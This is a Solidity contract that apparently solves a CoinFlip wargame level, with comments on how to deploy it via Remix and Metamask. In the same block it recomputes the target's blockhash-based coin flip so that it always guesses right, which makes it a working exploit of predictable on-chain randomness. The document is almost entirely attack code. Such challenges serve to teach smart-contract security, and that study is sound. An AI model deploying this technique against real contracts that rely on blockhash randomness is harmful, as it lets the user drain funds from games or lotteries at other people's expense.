// 1 - Deploy the contract with Remix using Injected Provider - Metamask
// 2 - Call the attack function 10 times
// 3 - Check the wins: await contract.consecutiveWins().then(x => x.toNumber()) - Chrome Console

pragma solidity ^0.6.0;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlipChallenge public challenge;

    constructor(address challengeAddress) public {
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    function attack() external payable {
        // simulate the same what the challenge contract does
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        // call challenge contract with same guess
        challenge.flip(side);
    }

    receive() external payable {}
}
